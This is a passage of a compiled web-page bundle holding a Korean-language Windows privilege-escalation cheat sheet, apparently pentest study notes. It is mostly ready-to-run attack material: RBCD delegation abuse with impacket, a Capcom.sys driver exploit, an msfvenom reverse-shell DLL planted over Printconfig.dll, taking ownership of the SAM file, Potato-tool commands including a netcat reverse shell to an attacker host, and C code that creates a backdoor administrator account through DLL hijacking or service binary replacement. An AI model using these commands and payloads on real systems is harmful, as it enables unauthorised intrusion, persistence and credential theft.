<USERNAME> -Add @{'msDS-AllowedToDelegateTo'=@('TIME/<DC>','TIME/<DC>.<DOMAIN>')}\n"})}),"\n",(0,l.jsx)(n.h4,{id:"\uc608\uc81c-2",children:"\uc608\uc81c 2"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-cmd",children:"# \ucef4\ud4e8\ud130 \uacc4\uc815 \uc0dd\uc131\nimpacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'Password123' -dc-ip <DC_IP> '<DOMAIN>/<USERNAME>:<PASSWORD>'\n\n# rbcd.py\npython3 rbcd.py -dc-ip <DC_IP> -t <TARGET_COMPUTER> -f 'FAKE01$' -d <DOMAIN> -u <USERNAME> -p <PASSWORD>\n\n# TGT \uc694\uccad\nimpacket-getST -spn 'cifs/<TARGET_COMPUTER>.<DOMAIN>' -impersonate Administrator -dc-ip <DC_IP> '<DOMAIN>/FAKE01$:Password123'\n"})}),"\n",(0,l.jsx)(n.h3,{id:"seloaddriverprivilege",children:"SeLoadDriverPrivilege"}),"\n",(0,l.jsx)(n.p,{children:"Capcom.sys \ub4dc\ub77c\uc774\ubc84 \ub85c\ub4dc \ucde8\uc57d\uc810"}),"\n",(0,l.jsxs)(n.blockquote,{children:["\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.a,{href:"https://github.com/TarlogicSecurity/EoPLoadDriver",children:"https://github.com/TarlogicSecurity/EoPLoadDriver"})}),"\n"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-cmd",children:"# \ub4dc\ub77c\uc774\ubc84 \ub85c\ub4dc\nEOPLOADDRIVER.exe System\\CurrentControlSet\\MyService C:\\PATH\\TO\\Capcom.sys\n\n# ExploitCapcom.exe \uc2e4\ud589\nExploitCapcom.exe\n"})}),"\n",(0,l.jsx)(n.h3,{id:"semanagevolumeprivilege",children:"SeManageVolumePrivilege"}),"\n",(0,l.jsx)(n.h4,{id:"c-\ub4dc\ub77c\uc774\ube0c-\uc804\uccb4-\uad8c\ud55c-\ubd80\uc5ec",children:"C:\\ \ub4dc\ub77c\uc774\ube0c \uc804\uccb4 \uad8c\ud55c \ubd80\uc5ec"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-cmd",children:"# C:\\ \uad8c\ud55c \ud655\uc778\nicacls C:\\\n\n# SeManageVolume \uc0ac\uc6a9\n# DLL \ub85c\ub4dc\n"})}),"\n",(0,l.jsx)(n.h4,{id:"printconfigdll-\ub36e\uc5b4\uc4f0\uae30",children:"Printconfig.dll \ub36e\uc5b4\uc4f0\uae30"}),"\n",(0,l.jsxs)(n.ol,{children:["\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.strong,{children:"\uc545\uc131 DLL \uc0dd\uc131"})}),"\n"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:"msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f dll -o evil.dll\n"})}),"\n",(0,l.jsxs)(n.ol,{start:"2",children:["\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.strong,{children:"Printconfig.dll \uad50\uccb4"})}),"\n"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-cmd",children:"# \uc6d0\ubcf8 \ubc31\uc5c5\nmove C:\\Windows\\System32\\spool\\drivers\\x64\\3\\Printconfig.dll Printconfig.dll.bak\n\n# \uc545\uc131 DLL \ubcf5\uc0ac\ncopy evil.dll C:\\Windows\\System32\\spool\\drivers\\x64\\3\\Printconfig.dll\n\n# Print Spooler \uc7ac\uc2dc\uc791\nnet stop spooler\nnet start spooler\n"})}),"\n",(0,l.jsx)(n.h3,{id:"setakeownershipprivilege",children:"SeTakeOwnershipPrivilege"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-cmd",children:"# \ud30c\uc77c \uc18c\uc720\uad8c \uac00\uc838\uc624\uae30\ntakeown /f C:\\PATH\\TO\\FILE\n\n# \uad8c\ud55c \ubd80\uc5ec\nicacls C:\\PATH\\TO\\FILE /grant <USERNAME>:F\n\n# \uc608\uc81c: SYSTEM \ud30c\uc77c\ntakeown /f C:\\Windows\\System32\\config\\SAM\nicacls C:\\Windows\\System32\\config\\SAM /grant <USERNAME>:F\n"})}),"\n",(0,l.jsx)(n.h3,{id:"seimpersonate--seassignprimarytoken",children:"SeImpersonate / SeAssignPrimaryToken"}),"\n",(0,l.jsx)(n.h4,{id:"juicypotato",children:"JuicyPotato"}),"\n",(0,l.jsxs)(n.blockquote,{children:["\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.a,{href:"https://github.com/ohpe/juicy-potato",children:"https://github.com/ohpe/juicy-potato"})}),"\n"]}),"\n",(0,l.jsxs)(n.p,{children:["CLSID \ucc3e\uae30: ",(0,l.jsx)(n.a,{href:"http://ohpe.it/juicy-potato/CLSID/",children:"http://ohpe.it/juicy-potato/CLSID/"})]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-cmd",children:'.\\JuicyPotato.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p C:\\Windows\\system32\\cmd.exe -a "/c whoami > C:\\temp\\output.txt" -t *\n'})}),"\n",(0,l.jsx)(n.h4,{id:"printspoofer",children:"PrintSpoofer"}),"\n",(0,l.jsxs)(n.blockquote,{children:["\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.a,{href:"https://github.com/itm4n/PrintSpoofer",children:"https://github.com/itm4n/PrintSpoofer"})}),"\n"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-cmd",children:".\\PrintSpoofer64.exe -i -c powershell.exe\n.\\PrintSpoofer64.exe -i -c cmd\n"})}),"\n",(0,l.jsx)(n.h4,{id:"godpotato",children:"GodPotato"}),"\n",(0,l.jsxs)(n.blockquote,{children:["\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.a,{href:"https://github.com/BeichenDream/GodPotato",children:"https://github.com/BeichenDream/GodPotato"})}),"\n"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-cmd",children:'.\\GodPotato-NET4.exe -cmd "cmd /c whoami"\n.\\GodPotato-NET4.exe -cmd "nc -e cmd <LHOST> <LPORT>"\n'})}),"\n",(0,l.jsx)(n.h2,{id:"dll-hijacking",children:"DLL Hijacking"}),"\n",(0,l.jsx)(n.h3,{id:"dll-\uac80\uc0c9-\uc21c\uc11c",children:"DLL \uac80\uc0c9 \uc21c\uc11c"}),"\n",(0,l.jsxs)(n.ol,{children:["\n",(0,l.jsx)(n.li,{children:"The directory from which the application loaded"}),"\n",(0,l.jsx)(n.li,{children:"The system directory (C:\\Windows\\System32)"}),"\n",(0,l.jsx)(n.li,{children:"The 16-bit system directory (C:\\Windows\\System)"}),"\n",(0,l.jsx)(n.li,{children:"The Windows directory (C:\\Windows)"}),"\n",(0,l.jsx)(n.li,{children:"The current directory"}),"\n",(0,l.jsx)(n.li,{children:"The directories in the PATH environment variable"}),"\n"]}),"\n",(0,l.jsx)(n.h3,{id:"dll-\uc545\uc6a9",children:"DLL \uc545\uc6a9"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-cmd",children:'# \uc4f0\uae30 \uac00\ub2a5\ud55c \uacbd\ub85c \ucc3e\uae30\nicacls "C:\\Program Files\\<APP>"\n\n# \ud504\ub85c\uc138\uc2a4\uac00 \ub85c\ub4dc\ud558\ub294 DLL \ud655\uc778\n.\\procmon.exe\n'})}),"\n",(0,l.jsx)(n.h3,{id:"customdllcpp",children:"customdll.cpp"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-cpp",children:'#include <stdlib.h>\n#include <windows.h>\n\nBOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {\n    switch (dwReason) {\n        case DLL_PROCESS_ATTACH:\n            system("cmd.exe /c net user hacker Password123! /add");\n            system("cmd.exe /c net localgroup administrators hacker /add");\n            break;\n        case DLL_THREAD_ATTACH:\n            break;\n        case DLL_THREAD_DETACH:\n            break;\n        case DLL_PROCESS_DETACH:\n            break;\n    }\n    return TRUE;\n}\n'})}),"\n",(0,l.jsx)(n.h3,{id:"\ucef4\ud30c\uc77c",children:"\ucef4\ud30c\uc77c"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:"x86_64-w64-mingw32-gcc customdll.cpp --shared -o customdll.dll\n"})}),"\n",(0,l.jsx)(n.h3,{id:"\uc2e4\ud589",children:"\uc2e4\ud589"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-cmd",children:'# DLL\uc744 \uacbd\ub85c\uc5d0 \ubcf5\uc0ac\ncopy customdll.dll "C:\\Program Files\\<APP>\\"\n\n# \uc11c\ube44\uc2a4 \uc7ac\uc2dc\uc791\nRestart-Service <SERVICE>\n\n# \ud655\uc778\nGet-LocalGroupMember administrators\n'})}),"\n",(0,l.jsx)(n.h2,{id:"windows-\uc11c\ube44\uc2a4-\uc545\uc6a9",children:"Windows \uc11c\ube44\uc2a4 \uc545\uc6a9"}),"\n",(0,l.jsx)(n.h3,{id:"\uc2e4\ud589-\uc911\uc778-\uc11c\ube44\uc2a4-\uc5f4\uac70",children:"\uc2e4\ud589 \uc911\uc778 \uc11c\ube44\uc2a4 \uc5f4\uac70"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-cmd",children:"Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}\n\nsc query\nGet-Service\n"})}),"\n",(0,l.jsx)(n.h3,{id:"\uc11c\ube44\uc2a4-\uc124\uc815-\ud655\uc778",children:"\uc11c\ube44\uc2a4 \uc124\uc815 \ud655\uc778"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-cmd",children:"Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like '<SERVICE>'}\n\nsc qc <SERVICE>\n"})}),"\n",(0,l.jsx)(n.h3,{id:"\uad8c\ud55c-\ud14c\uc774\ube14",children:"\uad8c\ud55c \ud14c\uc774\ube14"}),"\n",(0,l.jsxs)(n.table,{children:[(0,l.jsx)(n.thead,{children:(0,l.jsxs)(n.tr,{children:[(0,l.jsx)(n.th,{children:"Mask"}),(0,l.jsx)(n.th,{children:"Permissions"})]})}),(0,l.jsxs)(n.tbody,{children:[(0,l.jsxs)(n.tr,{children:[(0,l.jsx)(n.td,{children:"F"}),(0,l.jsx)(n.td,{children:"Full access"})]}),(0,l.jsxs)(n.tr,{children:[(0,l.jsx)(n.td,{children:"M"}),(0,l.jsx)(n.td,{children:"Modify access"})]}),(0,l.jsxs)(n.tr,{children:[(0,l.jsx)(n.td,{children:"RX"}),(0,l.jsx)(n.td,{children:"Read and execute access"})]}),(0,l.jsxs)(n.tr,{children:[(0,l.jsx)(n.td,{children:"R"}),(0,l.jsx)(n.td,{children:"Read-only access"})]}),(0,l.jsxs)(n.tr,{children:[(0,l.jsx)(n.td,{children:"W"}),(0,l.jsx)(n.td,{children:"Write-only access"})]})]})]}),"\n",(0,l.jsx)(n.h3,{id:"\uad8c\ud55c-\uc5f4\uac70",children:"\uad8c\ud55c \uc5f4\uac70"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-cmd",children:'icacls "C:\\PATH\\TO\\BINARY\\<BINARY>"\n\n.\\accesschk.exe /accepteula -quvw "C:\\PATH\\TO\\BINARY\\<BINARY>.exe"\n'})}),"\n",(0,l.jsx)(n.h3,{id:"\uc11c\ube44\uc2a4-\ubc14\uc774\ub108\ub9ac-\uad50\uccb4",children:"\uc11c\ube44\uc2a4 \ubc14\uc774\ub108\ub9ac \uad50\uccb4"}),"\n",(0,l.jsx)(n.h4,{id:"adduserc",children:"adduser.c"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-c",children:'#include <stdlib.h>\n\nint main ()\n{\n  int i;\n  \n  i = system ("net user hacker Password123! /add");\n  i = system ("net localgroup administrators hacker /add");\n  \n  return 0;\n}\n'})}),"\n",(0,l.jsx)(n.h4,{id:"\ucef4\ud30c\uc77c-1",children:"\ucef4\ud30c\uc77c"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:"x86_64-w64-mingw32-gcc adduser.c -o adduser.exe\ni686-w64-mingw32-gcc adduser.c -o adduser.exe  # 32bit\n"})}),"\n",(0,l.jsx)(n.h4,{id:"\uc2e4\ud589-1",children:"\uc2e4\ud589"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-cmd",children:"# \uc11c\ube44\uc2a4 \uc911\uc9c0 \ubc0f \uc2dc\uc791\nnet stop <SERVICE>\nnet start <SERVICE>\n\n# \ub610\ub294 \uc7ac\ubd80\ud305\nshutdown /r /t 0\n\n# \ud655\uc778\nGet-LocalGroupMember administrators\nnet localgroup administrators\n"})}),"\n",(0,l.jsx)(n.h3,{id:"unquoted-service-path",children:"Unquoted Service Path"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-cmd",children:'# \ucde8\uc57d\ud55c \uc11c\ube44\uc2a4 \ucc3e\uae30\nwmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\\Windows\\\\" | findstr /i /v """\n\n# PowerShell\nGet-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.PathName -notmatch "`"" -and $_.PathName -notmatch "C:\\\\Windows"}\n\n# \uad8c\ud55c \ud655\uc778\nicacls "C:\\Program Files\\Unquoted Path Service\\"\n\n# \uc545\uc131 \ubc14\uc774\ub108\ub9ac \ubc30\uce58\ncopy evil.exe "C:\\Program Files\\Unquoted.exe"\n\n# \uc11c\ube44\uc2a4 \uc7ac\uc2dc\uc791\nnet stop <SERVICE>\nnet start <SERVICE>\n'})}),"\n",(0,l.jsx)(n.h3,{id:"powerupps1",children:"PowerUp.ps1"}),"\n",(0,l.jsxs)(n.blockquote,{children:["\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.a,{href:"https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1",children:"https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1"})}),"\n"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-powershell",children:"powershell -ep bypass\n. .\\PowerUp.ps1\n\n# \ucde8\uc57d\ud55c \uc11c\ube44\uc2a4 \ucc3e\uae30\nGet-ModifiableServiceFile\n\n# \uc545\uc6a9\nInstall-ServiceBinary -Name '<SERVICE>'\n\n# \ub610\ub294\nWrite-ServiceBinary -Name '<SERVICE>' -Path 'C:\\Temp\\service.exe'\n"})}),"\n",(0,l.jsx)(n.h2,{id:"\ucc38\uace0",children:"\ucc38\uace0"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsxs)(n.li,{children:[(0,l.jsx)(n.strong,{children:"PayloadsAllTheThings"}),": Windows Privilege Escalation"]}),"\n",(0,l.jsxs)(n.li,{children:[(0,l.jsx)(n.strong,{children:"HackTricks"}),": Windows Local Privilege Escalation"]}),"\n",(0,l.jsxs)(n.li,{children:[(0,l.jsx)(n.strong,{children:"LOLBAS"}),": Living Off The Land Binaries and Scripts"]}),"\n",(0,l.jsxs)(n.li,{children:[(0,l.jsx)(n.strong,{children:"WinPEAS"}),": Windows \uad8c\ud55c \uc0c1\uc2b9 \uc790\ub3d9\ud654 \uc2a4\ud06c\ub9bd\ud2b8"]}),"\n",(0,l.jsxs)(n.li,{children:[(0,l.jsx)(n.strong,{children:"PowerUp"}),": PowerShell \uad8c\ud55c \uc0c1\uc2b9 \uc2a4\ud06c\ub9bd\ud2b8"]}),"\n",(0,l.jsxs)(n.li,{children:[(0,l.jsx)(n.strong,{children:"PrivescCheck"}),": PowerShell \uad8c\ud55c \uc0c1\uc2b9 \uc810\uac80 \uc2a4\ud06c\ub9bd\ud2b8"]}),"\n"]})]})}function h(e={}){const{wrapper:n}={...(0,r.R)(),...e.components};return n?(0,l.jsx)(n,{...e,children:(0,l.jsx)(o,{...e})}):o(e)}},8453:(e,n,s)=>{s.d(n,{R:()=>d,x:()=>c});var i=s(6540);const l={},r=i.createContext(l);function d(e){const n=i.useContext(r);return i.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function c(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(l):e.components||l:d(e.components),i.createElement(r.Provider,{value:n},e.children)}}}]);